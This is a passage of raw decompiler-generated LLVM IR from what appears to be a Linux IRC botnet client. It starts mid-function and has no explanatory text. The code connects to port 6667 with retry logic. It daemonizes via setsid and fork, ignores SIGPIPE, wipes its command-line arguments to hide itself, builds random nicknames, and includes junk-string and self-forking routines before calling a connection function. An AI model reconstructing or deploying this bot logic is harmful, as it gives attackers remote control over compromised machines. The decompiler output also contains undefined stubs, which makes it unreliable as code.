  store i32 %v0_8055b39, i32* %v3_8055b39, align 4
  %v1_8055b3a = load i32, i32* %stack_var_-4, align 4
  %v2_8055b3a = load i32, i32* %stack_var_0, align 4
  %v3_8055b3a = call i32 @bcopy(i32 %v1_8055aed, i32 %v1_8055b3a, i32 %v2_8055b3a)
  store i32 %v3_8055b3a, i32* %eax.global-to-local, align 4
  %v0_8055b3f = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055b58

dec_label_pc_8055b44:                             ; preds = %dec_label_pc_8055ace
  %v0_8055b44 = load i32, i32* @global_var_807d504.495, align 4
  store i32 %v0_8055b44, i32* %eax.global-to-local, align 4
  %v3_8055b4c = inttoptr i32 %v0_8055adc to i32*
  store i32 %v0_8055b44, i32* %v3_8055b4c, align 4
  %v1_8055b4d = call i32 @inet_addr(i32 %stack_var_-8.0)
  store i32 %v1_8055b4d, i32* %eax.global-to-local, align 4
  %v0_8055b52 = load i32, i32* @esp, align 4
  store i32 %v1_8055b4d, i32* %stack_var_-40, align 4
  br label %dec_label_pc_8055b58

dec_label_pc_8055b58:                             ; preds = %dec_label_pc_8055b1e, %dec_label_pc_8055b44
  %v0_8055b5e.in = phi i32 [ %v0_8055b3f, %dec_label_pc_8055b1e ], [ %v0_8055b52, %dec_label_pc_8055b44 ]
  %stack_var_-8.1 = phi i32 [ %v1_8055aed, %dec_label_pc_8055b1e ], [ %stack_var_-8.0, %dec_label_pc_8055b44 ]
  store i32 2, i32* %stack_var_-44, align 4
  %v2_8055b61 = inttoptr i32 %v0_8055b5e.in to i32*
  store i32 6667, i32* %v2_8055b61, align 4
  %v0_8055b66 = load i32, i32* %stack_var_-44, align 4
  %v1_8055b66 = call i32 @htons(i32 %v0_8055b66)
  %v0_8055b6b = load i32, i32* @esp, align 4
  %v0_8055b72 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055b72, i32* %edx.global-to-local, align 4
  store i32 %v2_8055b7b, i32* %eax.global-to-local, align 4
  %v2_8055b7e = add i32 %v0_8055b6b, 8
  %v3_8055b7e = inttoptr i32 %v2_8055b7e to i32*
  store i32 %v2_8055b7b, i32* %v3_8055b7e, align 4
  %v1_8055b7f = add i32 %v0_8055b6b, 4
  %v2_8055b7f = inttoptr i32 %v1_8055b7f to i32*
  store i32 21537, i32* %v2_8055b7f, align 4
  %v0_8055b84 = load i32, i32* %edx.global-to-local, align 4
  %v3_8055b84 = inttoptr i32 %v0_8055b6b to i32*
  store i32 %v0_8055b84, i32* %v3_8055b84, align 4
  %sext = mul i32 %v1_8055b66, 65536
  %v1_8055b85 = sdiv i32 %sext, 65536
  %v4_8055b85 = call i32 @ioctl(i32 %v1_8055b85, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8055b85, i32* %eax.global-to-local, align 4
  %v0_8055b8a = load i32, i32* @esp, align 4
  %v2_8055b90 = inttoptr i32 %v0_8055b8a to i32*
  store i32 0, i32* %v2_8055b90, align 4
  %v2_8055b92 = inttoptr i32 %v1_8055b85 to i32*
  %v3_8055b92 = call i32 @__GI_time(i32* %v2_8055b92)
  store i32 %v3_8055b92, i32* %eax.global-to-local, align 4
  %v1_8055c4c = inttoptr i32 %v3_8055b92 to i32*
  br label %dec_label_pc_8055c47

dec_label_pc_8055ba2:                             ; preds = %dec_label_pc_8055c47
  %v1_8055ba2 = call i32 @__errno_location(i32 %v3_8055b92)
  %v1_8055ba7 = inttoptr i32 %v1_8055ba2 to i32*
  store i32 0, i32* %v1_8055ba7, align 4
  store i32 %v2_8055b26, i32* %eax.global-to-local, align 4
  %v0_8055bb0 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055bb0, i32* %edx.global-to-local, align 4
  %v0_8055bb6 = load i32, i32* @esp, align 4
  %v1_8055bb9 = add i32 %v0_8055bb6, -8
  %v2_8055bb9 = inttoptr i32 %v1_8055bb9 to i32*
  store i32 16, i32* %v2_8055bb9, align 4
  %v2_8055bbb = add i32 %v0_8055bb6, -12
  %v3_8055bbb = inttoptr i32 %v2_8055bbb to i32*
  store i32 %v2_8055b26, i32* %v3_8055bbb, align 4
  %v0_8055bbc = load i32, i32* %edx.global-to-local, align 4
  %v2_8055bbc = add i32 %v0_8055bb6, -16
  %v3_8055bbc = inttoptr i32 %v2_8055bbc to i32*
  store i32 %v0_8055bbc, i32* %v3_8055bbc, align 4
  %v2_8055bbd = load i32, i32* %stack_var_-4, align 4
  %v3_8055bbd = call i32 @connect(i32 %v3_8055b92, i32 %stack_var_-8.1, i32 %v2_8055bbd)
  store i32 %v3_8055bbd, i32* %eax.global-to-local, align 4
  %v0_8055bc2 = load i32, i32* @esp, align 4
  %v1_8055bc2 = add i32 %v0_8055bc2, 16
  %v1_8055bc5 = icmp eq i32 %v3_8055bbd, 0
  br i1 %v1_8055bc5, label %dec_label_pc_8055bd5, label %dec_label_pc_8055bc9

dec_label_pc_8055bc9:                             ; preds = %dec_label_pc_8055ba2
  %v1_8055bc9 = call i32 @__errno_location(i32 %v3_8055b92)
  store i32 %v1_8055bc9, i32* %eax.global-to-local, align 4
  %v1_8055bce = inttoptr i32 %v1_8055bc9 to i32*
  %v2_8055bce = load i32, i32* %v1_8055bce, align 4
  store i32 %v2_8055bce, i32* %eax.global-to-local, align 4
  %v9_8055bd0 = icmp eq i32 %v2_8055bce, 106
  %v1_8055bd3 = icmp eq i1 %v9_8055bd0, false
  br i1 %v1_8055bd3, label %dec_label_pc_8055c22, label %dec_label_pc_8055bc9.dec_label_pc_8055bd5_crit_edge

dec_label_pc_8055bc9.dec_label_pc_8055bd5_crit_edge: ; preds = %dec_label_pc_8055bc9
  %v0_8055bda.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055bd5

dec_label_pc_8055bd5:                             ; preds = %dec_label_pc_8055ba2, %dec_label_pc_8055bc9.dec_label_pc_8055bd5_crit_edge
  %v0_8055bda = phi i32 [ %v0_8055bda.pre, %dec_label_pc_8055bc9.dec_label_pc_8055bd5_crit_edge ], [ %v1_8055bc2, %dec_label_pc_8055ba2 ]
  %v0_8055bd5 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055bd5, i32* %eax.global-to-local, align 4
  %v1_8055bdd = add i32 %v0_8055bda, -16
  %v2_8055bdd = inttoptr i32 %v1_8055bdd to i32*
  store i32 0, i32* %v2_8055bdd, align 4
  %v1_8055bdf = add i32 %v0_8055bda, -20
  %v2_8055bdf = inttoptr i32 %v1_8055bdf to i32*
  store i32 0, i32* %v2_8055bdf, align 4
  %v1_8055be1 = add i32 %v0_8055bda, -24
  %v2_8055be1 = inttoptr i32 %v1_8055be1 to i32*
  store i32 13, i32* %v2_8055be1, align 4
  %v1_8055be3 = add i32 %v0_8055bda, -28
  %v2_8055be3 = inttoptr i32 %v1_8055be3 to i32*
  store i32 1, i32* %v2_8055be3, align 4
  %v0_8055be5 = load i32, i32* %eax.global-to-local, align 4
  %v2_8055be5 = add i32 %v0_8055bda, -32
  %v3_8055be5 = inttoptr i32 %v2_8055be5 to i32*
  store i32 %v0_8055be5, i32* %v3_8055be5, align 4
  %v2_8055be6 = load i32, i32* %stack_var_-4, align 4
  %v3_8055be6 = load i32, i32* %stack_var_0, align 4
  %v5_8055be6 = call i32 @__GI_setsockopt(i32 %v3_8055b92, i32 %stack_var_-8.1, i32 %v2_8055be6, i32 %v3_8055be6, i32 ptrtoint (i32* @0 to i32))
  %v0_8055beb = load i32, i32* @esp, align 4
  %v0_8055bee = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055bee, i32* %eax.global-to-local, align 4
  %v1_8055bf6 = add i32 %v0_8055beb, 16
  %v2_8055bf6 = inttoptr i32 %v1_8055bf6 to i32*
  store i32 0, i32* %v2_8055bf6, align 4
  %v1_8055bf8 = add i32 %v0_8055beb, 12
  %v2_8055bf8 = inttoptr i32 %v1_8055bf8 to i32*
  store i32 0, i32* %v2_8055bf8, align 4
  %v1_8055bfa = add i32 %v0_8055beb, 8
  %v2_8055bfa = inttoptr i32 %v1_8055bfa to i32*
  store i32 2, i32* %v2_8055bfa, align 4
  %v1_8055bfc = add i32 %v0_8055beb, 4
  %v2_8055bfc = inttoptr i32 %v1_8055bfc to i32*
  store i32 1, i32* %v2_8055bfc, align 4
  %v0_8055bfe = load i32, i32* %eax.global-to-local, align 4
  %v3_8055bfe = inttoptr i32 %v0_8055beb to i32*
  store i32 %v0_8055bfe, i32* %v3_8055bfe, align 4
  %v2_8055bff = load i32, i32* %stack_var_-4, align 4
  %v3_8055bff = load i32, i32* %stack_var_0, align 4
  %v5_8055bff = call i32 @__GI_setsockopt(i32 %v3_8055b92, i32 %stack_var_-8.1, i32 %v2_8055bff, i32 %v3_8055bff, i32 ptrtoint (i32* @0 to i32))
  %v0_8055c04 = load i32, i32* @esp, align 4
  %v0_8055c07 = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055c07, i32* %eax.global-to-local, align 4
  %v1_8055c0f = add i32 %v0_8055c04, 16
  %v2_8055c0f = inttoptr i32 %v1_8055c0f to i32*
  store i32 0, i32* %v2_8055c0f, align 4
  %v1_8055c11 = add i32 %v0_8055c04, 12
  %v2_8055c11 = inttoptr i32 %v1_8055c11 to i32*
  store i32 0, i32* %v2_8055c11, align 4
  %v1_8055c13 = add i32 %v0_8055c04, 8
  %v2_8055c13 = inttoptr i32 %v1_8055c13 to i32*
  store i32 9, i32* %v2_8055c13, align 4
  %v1_8055c15 = add i32 %v0_8055c04, 4
  %v2_8055c15 = inttoptr i32 %v1_8055c15 to i32*
  store i32 1, i32* %v2_8055c15, align 4
  %v0_8055c17 = load i32, i32* %eax.global-to-local, align 4
  %v3_8055c17 = inttoptr i32 %v0_8055c04 to i32*
  store i32 %v0_8055c17, i32* %v3_8055c17, align 4
  %v2_8055c18 = load i32, i32* %stack_var_-4, align 4
  %v3_8055c18 = load i32, i32* %stack_var_0, align 4
  %v5_8055c18 = call i32 @__GI_setsockopt(i32 %v3_8055b92, i32 %stack_var_-8.1, i32 %v2_8055c18, i32 %v3_8055c18, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055c18, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c80

dec_label_pc_8055c22:                             ; preds = %dec_label_pc_8055bc9
  %v1_8055c22 = call i32 @__errno_location(i32 %v3_8055b92)
  store i32 %v1_8055c22, i32* %eax.global-to-local, align 4
  %v1_8055c27 = inttoptr i32 %v1_8055c22 to i32*
  %v2_8055c27 = load i32, i32* %v1_8055c27, align 4
  store i32 %v2_8055c27, i32* %eax.global-to-local, align 4
  %v9_8055c29 = icmp eq i32 %v2_8055c27, 115
  br i1 %v9_8055c29, label %dec_label_pc_8055c3a, label %dec_label_pc_8055c2e

dec_label_pc_8055c2e:                             ; preds = %dec_label_pc_8055c22
  %v1_8055c2e = call i32 @__errno_location(i32 %v3_8055b92)
  store i32 %v1_8055c2e, i32* %eax.global-to-local, align 4
  %v1_8055c33 = inttoptr i32 %v1_8055c2e to i32*
  %v2_8055c33 = load i32, i32* %v1_8055c33, align 4
  store i32 %v2_8055c33, i32* %eax.global-to-local, align 4
  %v9_8055c35 = icmp eq i32 %v2_8055c33, 114
  %v1_8055c38 = icmp eq i1 %v9_8055c35, false
  br i1 %v1_8055c38, label %dec_label_pc_8055c2e.dec_label_pc_8055c60_crit_edge, label %dec_label_pc_8055c3a

dec_label_pc_8055c2e.dec_label_pc_8055c60_crit_edge: ; preds = %dec_label_pc_8055c2e
  %v0_8055c6f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8055c60

dec_label_pc_8055c3a:                             ; preds = %dec_label_pc_8055c2e, %dec_label_pc_8055c22
  %v0_8055c3a = load i32, i32* @esp, align 4
  %v1_8055c3d = add i32 %v0_8055c3a, -16
  %v2_8055c3d = inttoptr i32 %v1_8055c3d to i32*
  store i32 1, i32* %v2_8055c3d, align 4
  %v1_8055c3f = call i32 @sleep(i32 %v3_8055b92)
  store i32 %v1_8055c3f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055c47

dec_label_pc_8055c47:                             ; preds = %dec_label_pc_8055b58, %dec_label_pc_8055c3a
  %storemerge4.in.in = load i32, i32* @esp, align 4
  %v2_8055c4a = inttoptr i32 %storemerge4.in.in to i32*
  store i32 0, i32* %v2_8055c4a, align 4
  %v2_8055c4c = call i32 @__GI_time(i32* %v1_8055c4c)
  %v0_8055c51 = load i32, i32* @esp, align 4
  %v1_8055c51 = add i32 %v0_8055c51, 16
  %v5_8055c54 = sub i32 %v2_8055c4c, %v3_8055b92
  store i32 %v5_8055c54, i32* %eax.global-to-local, align 4
  %tmp55 = icmp ult i32 %v5_8055c54, 10
  br i1 %tmp55, label %dec_label_pc_8055ba2, label %dec_label_pc_8055c60

dec_label_pc_8055c60:                             ; preds = %dec_label_pc_8055c47, %dec_label_pc_8055c2e.dec_label_pc_8055c60_crit_edge
  %v0_8055c6f = phi i32 [ %v0_8055c6f.pre, %dec_label_pc_8055c2e.dec_label_pc_8055c60_crit_edge ], [ %v1_8055c51, %dec_label_pc_8055c47 ]
  store i32 0, i32* @global_var_807d504.495, align 4
  %v0_8055c6a = load i32, i32* @global_var_807d3d0.29, align 16
  store i32 %v0_8055c6a, i32* %eax.global-to-local, align 4
  %v2_8055c72 = add i32 %v0_8055c6f, -16
  %v3_8055c72 = inttoptr i32 %v2_8055c72 to i32*
  store i32 %v0_8055c6a, i32* %v3_8055c72, align 4
  %v1_8055c73 = call i32 @close(i32 %v3_8055b92)
  br label %dec_label_pc_8055a53.backedge

dec_label_pc_8055c80:                             ; preds = %dec_label_pc_8055a46, %dec_label_pc_8055bd5
  %v0_8055c81 = phi i32 [ 0, %dec_label_pc_8055a46 ], [ %v5_8055c18, %dec_label_pc_8055bd5 ]
  %v2_8055c80 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055c80, i32* @ebp, align 4
  ret i32 %v0_8055c81

; uselistorder directives
  uselistorder i32 %v0_8055bda, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v3_8055b92, { 3, 10, 5, 4, 6, 0, 1, 2, 7, 8, 9, 11, 12 }
  uselistorder i32 %v1_8055b85, { 1, 0 }
  uselistorder i32 %stack_var_-8.1, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_8055af2, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8055aed, { 2, 3, 5, 4, 7, 6, 0, 1, 8, 9 }
  uselistorder i32 %v0_8055adc, { 1, 0 }
  uselistorder i32 %v3_8055aa3, { 2, 1, 0 }
  uselistorder i32 %v0_8055a9a, { 2, 1, 0 }
  uselistorder i32 %v2_8055b26, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 5, 2, 1, 0, 4, 3, 7, 6 }
  uselistorder i32* %stack_var_-24, { 0, 2, 1 }
  uselistorder i32* %stack_var_-44, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-40, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %stack_var_0, { 2, 1, 0, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 18, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 12, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 0, 30, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43 }
  uselistorder i32 (i32, i32, i32)* @connect, { 8, 7, 6, 9, 1, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32)* @htons, { 64, 63, 62, 65, 3, 2, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @getsockopt, { 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_8055c80, { 1, 0 }
  uselistorder label %dec_label_pc_8055c47, { 1, 0 }
  uselistorder label %dec_label_pc_8055bd5, { 1, 0 }
  uselistorder label %dec_label_pc_8055b58, { 1, 0 }
  uselistorder label %dec_label_pc_8055a53.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8055a90, { 1, 0 }
  uselistorder label %dec_label_pc_8055a53.preheader, { 1, 0 }
}

define i32 @makeFukdString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8055c85 = load i32, i32* @ebx, align 4
  %v2_8055c8e = call i32 @__GI_time(i32* null)
  %v1_8055c9a = call i32 @srand(i32 %v2_8055c8e)
  %v5_8055cb7 = ptrtoint i8* %arg1 to i32
  %v5_8055cdf14 = icmp sgt i32 %arg2, 0
  br i1 %v5_8055cdf14, label %dec_label_pc_8055cb2, label %dec_label_pc_8055ce1

dec_label_pc_8055cb2:                             ; preds = %entry, %dec_label_pc_8055cb2
  %storemerge15 = phi i32 [ %v4_8055cd6, %dec_label_pc_8055cb2 ], [ 0, %entry ]
  %v6_8055cb7 = add i32 %storemerge15, %v5_8055cb7
  store i32 %v6_8055cb7, i32* @ebx, align 4
  %v0_8055cba = call i32 @random()
  store i32 223, i32* @ecx, align 4
  %v2_8055cca = ashr i32 %v0_8055cba, 31
  %v2_8055ccd = zext i32 %v0_8055cba to i64
  %v4_8055ccd = zext i32 %v2_8055cca to i64
  %v5_8055ccd = mul nuw i64 %v4_8055ccd, 4294967296
  %v6_8055ccd = or i64 %v5_8055ccd, %v2_8055ccd
  %v10_8055ccd = srem i64 %v6_8055ccd, 223
  %v11_8055ccd = trunc i64 %v10_8055ccd to i8
  %v1_8055cd1 = add i8 %v11_8055ccd, 33
  %v2_8055cd4 = load i32, i32* @ebx, align 4
  %v3_8055cd4 = inttoptr i32 %v2_8055cd4 to i8*
  store i8 %v1_8055cd1, i8* %v3_8055cd4, align 1
  %v4_8055cd6 = add nuw nsw i32 %storemerge15, 1
  %exitcond = icmp eq i32 %v4_8055cd6, %arg2
  br i1 %exitcond, label %dec_label_pc_8055ce1, label %dec_label_pc_8055cb2

dec_label_pc_8055ce1:                             ; preds = %dec_label_pc_8055cb2, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %arg2, %dec_label_pc_8055cb2 ]
  store i32 %v0_8055c85, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8055cd6, { 1, 0 }
  uselistorder i32 223, { 1, 0 }
  uselistorder label %dec_label_pc_8055cb2, { 1, 0 }
}

define i32 @touchMyself(i32* %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8055ce6 = load i32, i32* @ebp, align 4
  store i32 %v0_8055ce6, i32* %stack_var_-4, align 4
  %v4_8055ce6 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8055ce6, i32* @ebp, align 4
  %v1_8055cec = call i32 @fork(i32 %v0_8055ce6)
  %v1_8055cf1 = icmp eq i32 %v1_8055cec, 0
  %v1_8055cf3 = icmp eq i1 %v1_8055cf1, false
  br i1 %v1_8055cf3, label %dec_label_pc_8055d35, label %dec_label_pc_8055cf5.preheader

dec_label_pc_8055cf5.preheader:                   ; preds = %entry
  br label %dec_label_pc_8055cf5

dec_label_pc_8055cf5:                             ; preds = %dec_label_pc_8055cf5.preheader, %dec_label_pc_8055cf5
  %v0_8055cf5 = call i32 @random()
  %v2_8055d0c = srem i32 %v0_8055cf5, 128
  %v1_8055d0e = add nsw i32 %v2_8055d0c, 1024
  %v2_8055d17 = load i32, i32* %arg1, align 4
  %v2_8055d1e = inttoptr i32 %v2_8055d17 to i8*
  %v3_8055d1e = call i32 @makeFukdString(i8* %v2_8055d1e, i32 %v1_8055d0e)
  %v1_8055d2b = call i32 @sleep(i32 3)
  br label %dec_label_pc_8055cf5

dec_label_pc_8055d35:                             ; preds = %entry
  %v2_8055d35 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8055d35, i32* @ebp, align 4
  ret i32 %v1_8055cec

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8055cf5, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp74 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-32 = alloca i8*, align 4
  %tmp77 = call i32 @__decompiler_undefined_function_0()
  %tmp83 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1484 = alloca i32, align 4
  %stack_var_-2508 = alloca i32, align 4
  %stack_var_-6604 = alloca i32, align 4
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-6656 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_4 = alloca i32, align 4
  %v2_8055d37 = ptrtoint i32* %stack_var_4 to i32
  store i32 %v2_8055d37, i32* %stack_var_-24, align 4
  %v1_8055d54 = call i32 @__GI_setsid(i32 %v2_8055d37)
  store i32 %v1_8055d54, i32* %eax.global-to-local, align 4
  store i32 13, i32* %stack_var_-6656, align 4
  %v2_8055d60 = call i32 @__bsd_signal(i32 13, i32 1)
  store i32 %v2_8055d60, i32* %eax.global-to-local, align 4
  %v1_8055d68 = call i32 @fork(i32 13)
  store i32 %v1_8055d68, i32* %eax.global-to-local, align 4
  %v1_8055d6d = icmp eq i32 %v1_8055d68, 0
  br i1 %v1_8055d6d, label %dec_label_pc_805630e, label %dec_label_pc_8055d75

dec_label_pc_8055d75:                             ; preds = %entry
  %v1_8055d7b = add i32 %v2_8055d37, 4
  store i32 %v1_8055d7b, i32* %eax.global-to-local, align 4
  store i32 %v1_8055d7b, i32* %stack_var_-6656, align 4
  %v1_8055d82 = inttoptr i32 %v1_8055d7b to i32*
  %v2_8055d82 = call i32 @touchMyself(i32* %v1_8055d82)
  store i32 1702524235, i32* @global_var_807d2c0.63, align 64
  store i32 1886283123, i32* @global_var_807d2c4.602, align 4
  store i32 1934190945, i32* @global_var_807d2c8.603, align 8
  store i32 1920298841, i32* @global_var_807d2cc.604, align 4
  store i32 6582087, i32* @global_var_807d2d0.605, align 16
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v2_8055d37, i32* @edi, align 4
  %v3_8055e29162 = load i32, i32* %stack_var_4, align 4
  %v5_8055e2b170 = icmp sgt i32 %v3_8055e29162, 1
  br i1 %v5_8055e2b170, label %dec_label_pc_8055dc5, label %dec_label_pc_8055e2d

dec_label_pc_8055dc5:                             ; preds = %dec_label_pc_8055d75, %dec_label_pc_8055dc5
  %storemerge10171 = phi i32 [ %v4_8055e1d, %dec_label_pc_8055dc5 ], [ 1, %dec_label_pc_8055d75 ]
  %v2_8055dc8 = mul i32 %storemerge10171, 4
  store i32 %v2_8055dc8, i32* %eax.global-to-local, align 4
  store i32 %v2_8055dc8, i32* %edx.global-to-local, align 4
  %v3_8055dd3 = load i32, i32* %v1_8055d82, align 4
  %v2_8055dd6 = add i32 %v3_8055dd3, %v2_8055dc8
  store i32 %v2_8055dd6, i32* %eax.global-to-local, align 4
  %v1_8055dd9 = inttoptr i32 %v2_8055dd6 to i32*
  %v2_8055dd9 = load i32, i32* %v1_8055dd9, align 4
  %v1_8055de6 = and i32 %v2_8055dd9, -256
  store i32 %v1_8055de6, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8055de9 = inttoptr i32 %v2_8055dd9 to i8*
  store i32 %v2_8055dd9, i32* @edi, align 4
  %v3_8055def = call i32 @_strlen(i8* %v4_8055de9)
  store i32 %v2_8055dc8, i32* %eax.global-to-local, align 4
  store i32 %v2_8055dc8, i32* %edx.global-to-local, align 4
  store i32 %v2_8055d37, i32* @ebx, align 4
  %v3_8055e06 = load i32, i32* %v1_8055d82, align 4
  %v2_8055e09 = add i32 %v3_8055e06, %v2_8055dc8
  store i32 %v2_8055e09, i32* %eax.global-to-local, align 4
  %v1_8055e0c = inttoptr i32 %v2_8055e09 to i32*
  %v2_8055e0c = load i32, i32* %v1_8055e0c, align 4
  store i32 %v2_8055e0c, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e0c, i32* %stack_var_-6656, align 4
  %v3_8055e15 = inttoptr i32 %v2_8055e0c to i8*
  %v4_8055e15 = call i32 @__GI_memset(i8* %v3_8055e15, i32 0, i32 %v3_8055def)
  %v4_8055e1d = add i32 %storemerge10171, 1
  store i32 %v4_8055e1d, i32* %eax.global-to-local, align 4
  store i32 %v2_8055d37, i32* @edi, align 4
  %v3_8055e29 = load i32, i32* %stack_var_4, align 4
  %v5_8055e2b = icmp slt i32 %v4_8055e1d, %v3_8055e29
  br i1 %v5_8055e2b, label %dec_label_pc_8055dc5, label %dec_label_pc_8055e2d

dec_label_pc_8055e2d:                             ; preds = %dec_label_pc_8055dc5, %dec_label_pc_8055d75
  %stack_var_-6624.0.lcssa = phi i32 [ %tmp83, %dec_label_pc_8055d75 ], [ %v2_8055dd9, %dec_label_pc_8055dc5 ]
  store i32 0, i32* %stack_var_-6656, align 4
  %v2_8055e32 = call i32 @__GI_time(i32* null)
  store i32 %v2_8055e32, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e32, i32* @ebx, align 4
  %v1_8055e3c = call i32 @__libc_getpid(i32 0)
  store i32 %v1_8055e3c, i32* %eax.global-to-local, align 4
  %v0_8055e41 = load i32, i32* @ebx, align 4
  %v2_8055e41 = xor i32 %v0_8055e41, %v1_8055e3c
  store i32 %v2_8055e41, i32* @ebx, align 4
  %v0_8055e43 = load i32, i32* %stack_var_-6656, align 4
  %v1_8055e43 = call i32 @getppid(i32 %v0_8055e43)
  %v0_8055e48 = load i32, i32* @ebx, align 4
  %v2_8055e48 = add i32 %v0_8055e48, %v1_8055e43
  store i32 %v2_8055e48, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e48, i32* %stack_var_-6656, align 4
  %v1_8055e4f = call i32 @srand(i32 %v2_8055e48)
  store i32 %v1_8055e4f, i32* %eax.global-to-local, align 4
  store i32 4, i32* %stack_var_-6656, align 4
  %v2_8055e5e = call i32 @realrand(i32 4, i32 8)
  store i32 %v2_8055e5e, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e5e, i32* %stack_var_-6656, align 4
  %v1_8055e6a = inttoptr i32 %v2_8055e5e to i8*
  %v2_8055e6a = call i32 @randstring(i8* %v1_8055e6a)
  store i32 %v2_8055e6a, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e6a, i32* @global_var_807d3cc.53, align 4
  store i32 4, i32* %stack_var_-6656, align 4
  %v2_8055e7e = call i32 @realrand(i32 4, i32 8)
  store i32 %v2_8055e7e, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e7e, i32* %stack_var_-6656, align 4
  %v1_8055e8a = inttoptr i32 %v2_8055e7e to i8*
  %v2_8055e8a = call i32 @randstring(i8* %v1_8055e8a)
  store i32 %v2_8055e8a, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e8a, i32* @global_var_807d3c4.36, align 4
  store i32 4, i32* %stack_var_-6656, align 4
  %v2_8055e9e = call i32 @realrand(i32 4, i32 8)
  store i32 %v2_8055e9e, i32* %eax.global-to-local, align 4
  store i32 %v2_8055e9e, i32* %stack_var_-6656, align 4
  %v1_8055eaa = inttoptr i32 %v2_8055e9e to i8*
  %v2_8055eaa = call i32 @randstring(i8* %v1_8055eaa)
  store i32 %v2_8055eaa, i32* %eax.global-to-local, align 4
  store i32 %v2_8055eaa, i32* @global_var_807d3f0.606, align 16
  store i32 ptrtoint ([7 x i8]* @global_var_806c742.607 to i32), i32* @global_var_807e56c.330, align 4
  store i32 ptrtoint (i32* @global_var_806c749.608 to i32), i32* @global_var_807e53c.591, align 4
  store i32 0, i32* @global_var_807d504.495, align 4
  %v2_8055f1f = ptrtoint i32* %stack_var_-460 to i32
  %tmp104 = bitcast i32* %stack_var_-460 to i8*
  %v2_8055f67 = ptrtoint i32* %stack_var_-332 to i32
  %v2_80560cb = ptrtoint i32* %stack_var_-6604 to i32
  %v2_805619b = ptrtoint i32* %stack_var_-2508 to i32
  %v2_80561f2 = ptrtoint i32* %stack_var_-1484 to i32
  %tmp105 = bitcast i8** %stack_var_-32 to i32*
  br label %dec_label_pc_8055ed7

dec_label_pc_8055ed7:                             ; preds = %dec_label_pc_80562ba, %dec_label_pc_8055f15, %dec_label_pc_80560bf, %dec_label_pc_8055e2d
  %stack_var_-6628.0 = phi i8* [ %tmp74, %dec_label_pc_8055e2d ], [ %stack_var_-6628.2.ph, %dec_label_pc_80562ba ], [ %stack_var_-6628.1.ph.ph111, %dec_label_pc_8055f15 ], [ %stack_var_-6628.1.ph.ph111, %dec_label_pc_80560bf ]
  %stack_var_-40.0 = phi i32 [ %tmp77, %dec_label_pc_8055e2d ], [ %stack_var_-40.3.lcssa, %dec_label_pc_80562ba ], [ %stack_var_-40.1, %dec_label_pc_8055f15 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_80560bf ]
  %v0_8055ed7 = call i32 @con()
  store i32 %v0_8055ed7, i32* %eax.global-to-local, align 4
  %v0_8055edc = load i32, i32* @global_var_807d3c4.36, align 4
  store i32 %v0_8055edc, i32* @ebx, align 4
  %v0_8055ee2 = load i32, i32* @global_var_807d3f0.606, align 16
  store i32 %v0_8055ee2, i32* @esi, align 4
